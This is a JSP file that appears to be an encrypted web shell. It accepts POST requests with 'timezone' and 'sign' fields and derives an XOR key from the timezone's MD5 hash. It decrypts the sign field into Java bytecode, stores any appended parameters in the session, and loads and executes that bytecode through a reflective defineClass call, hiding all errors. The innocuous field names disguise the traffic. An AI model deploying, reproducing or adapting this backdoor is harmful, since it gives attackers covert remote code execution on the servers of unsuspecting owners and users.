<%@page import="java.lang.reflect.*,java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*,java.security.*,java.math.*"%>
<%!
  class MyLoader extends ClassLoader {
    MyLoader(ClassLoader c) {
      super(c);
    }
  }

  class Handle {
    public Handle(byte[] classBytes, Object pageContext) {
      try {
        MyLoader ml = new MyLoader(this.getClass().getClassLoader());
        Method m = ml.getClass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        m.setAccessible(true);
        Class cls = (Class)m.invoke(ml, new Object[]{classBytes, 0, classBytes.length});
        cls.newInstance().equals(pageContext);
      } catch (Exception e) {
        return; // 如果这里没有retrun，下面的代码会继续执行。当然这里不会，因为是在类里面
      }
    }
  }
%>

<%
  try {
    // Read POST data
    StringBuilder sb = new StringBuilder();
    String line;
    BufferedReader reader = request.getReader();
    while ((line = reader.readLine()) != null) {
      sb.append(line);
    }
    String postData = sb.toString();

    if (postData != null && !postData.isEmpty()) {
      // Simple JSON parsing (manual)
      String timezone = null;
      String sign = null;

      // Extract timezone
      int timezoneStart = postData.indexOf("\"timezone\":");
      if (timezoneStart != -1) {
        int valueStart = postData.indexOf(":") + 1;
        int valueEnd = postData.indexOf(",");
        if (valueStart > 0 && valueEnd > valueStart) {
          timezone = postData.substring(valueStart, valueEnd);
        }
      }

      // Extract sign
      int signStart = postData.indexOf("\"sign\":");
      if (signStart != -1) {
        int valueStart = postData.indexOf("\"", signStart + 7) + 1;
        int valueEnd = postData.indexOf("\"", valueStart);
        if (valueStart > 0 && valueEnd > valueStart) {
          sign = postData.substring(valueStart, valueEnd);
        }
      }

      if (timezone != null && sign != null) {
        // Generate key from timezone (MD5 first 16 characters)
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(timezone.getBytes("UTF-8"));
        String md5Hash = new BigInteger(1, md.digest()).toString(16);
        while (md5Hash.length() < 32) {
          md5Hash = "0" + md5Hash;
        }
        String key = md5Hash.substring(0, 16);

        // Store key in session
        session.setAttribute("k", key);

        // Base64 decode the sign
        byte[] decodedSign;
        String ver = System.getProperty("java.version");
        if (ver.compareTo("1.8") >= 0) {
          Class Base64 = Class.forName("java.util.Base64");
          Object Decoder = Base64.getMethod("getDecoder", (Class[]) null).invoke(Base64, (Object[]) null);
          decodedSign = (byte[]) Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{sign});
        } else {
          Class Base64 = Class.forName("sun.misc.BASE64Decoder");
          Object Decoder = Base64.newInstance();
          decodedSign = (byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{sign});
        }

        // XOR decryption
        byte[] keyBytes = key.getBytes("UTF-8");
        for (int i = 0; i < decodedSign.length; i++) {
          decodedSign[i] = (byte)(decodedSign[i] ^ keyBytes[(i + 1) & 15]);
        }

        // Find the last occurrence of 5 consecutive underscore bytes (0x5F)
        int separatorIndex = -1;
        byte underscoreByte = (byte)0x5F; // ASCII value of '_'

        // Search from the end backwards for 5 consecutive underscores
        for (int i = decodedSign.length - 5; i >= 0; i--) {
          boolean found = true;
          for (int j = 0; j < 5; j++) {
            if (decodedSign[i + j] != underscoreByte) {
              found = false;
              break;
            }
          }
          if (found) {
            separatorIndex = i;
            break;
          }
        }

        if (separatorIndex != -1) {
          // Split into shellcode bytes and parameters
          byte[] shellcodeBytes = new byte[separatorIndex];
          System.arraycopy(decodedSign, 0, shellcodeBytes, 0, separatorIndex);

          // Extract parameters part as string (after the 5 underscores)
          int paramsStart = separatorIndex + 5;
          if (paramsStart < decodedSign.length) {
            byte[] paramsBytes = new byte[decodedSign.length - paramsStart];
            System.arraycopy(decodedSign, paramsStart, paramsBytes, 0, paramsBytes.length);
            String paramsPart = new String(paramsBytes, "UTF-8");

            // Parse parameters (key1-value1,key2-value2,... format)
            if (paramsPart != null && !paramsPart.isEmpty()) {
              String[] pairs = paramsPart.split(",");
              for (String pair : pairs) {
                pair = pair.trim();
                if (pair.contains("-")) {
                  int dashIndex = pair.indexOf("-");
                  String paramKey = pair.substring(0, dashIndex).trim();
                  String paramValue = pair.substring(dashIndex + 1).trim();
                  if (!paramKey.isEmpty()) {
                    // registered needed params in session
                    session.setAttribute(paramKey, paramValue);
                  }
                }
              }
            }
          }

          // Execute the shellcode with original bytes
          new Handle(shellcodeBytes, pageContext);
        } else {
          // If no separator found, treat entire payload as shellcode
          new Handle(decodedSign, pageContext);
        }
      }
    }
  } catch (Exception e) {
    // Silent error handling
  }
  out = pageContext.pushBody();
%>